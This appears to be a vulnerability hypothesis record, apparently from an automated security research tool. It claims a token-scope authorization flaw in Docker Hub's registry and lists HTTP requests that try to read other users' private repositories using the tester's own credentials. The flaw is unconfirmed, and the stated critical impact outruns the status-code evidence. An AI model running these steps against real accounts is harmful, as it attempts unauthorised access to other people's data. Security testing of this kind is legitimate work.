[HYP docker] Docker Registry BOLA via token scope confusion
class: BOLA
asset: registry-1.docker.io
confidence: 73
reasoning: auth.docker.io/token?service=registry.docker.io&scope=repository:<victim-ns>/<private-repo>:pull returns 200 application/json even for private victim scope using owned creds (probe 2026-08-29, 2026-09-06). registry-1.docker.io/v2/ returns 401 base, but /v2/<victim-ns>/<private-repo>/tags/list and manifests/latest return 404 vs 401 differential indicates auth oracle not yet JSON-differentiated.
evidence_needed: JWT from auth.docker.io with victim scope used as Bearer to registry-1.docker.io/v2/<victim-ns>/<private-repo>/tags/list returns 200 application/json with repo metadata vs 401/403 JSON error for unauthorized; need owned-JWT vs victim-JWT comparison.
verify_steps: 1) GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:<owned-ns>/<owned-private>:pull -u "<owned-user>:<owned-pass>" -H "Accept: application/json" -> capture token. 2) GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:<victim-ns>/<private-repo>:pull -u "<owned-user>:<owned-pass>" -H "Accept: application/json" -> capture victim-scoped JWT. 3) GET https://registry-1.docker.io/v2/<victim-ns>/<private-repo>/tags/list -H "Authorization: Bearer <victim-scoped-JWT>" -H "Accept: application/json" . 4) same with owned-scoped JWT for comparison, compare status/body JSON.
impact: Cross-tenant private image enumeration/pull, registry compromise, supply chain takeover; critical.
testability: AUTH_HELPED

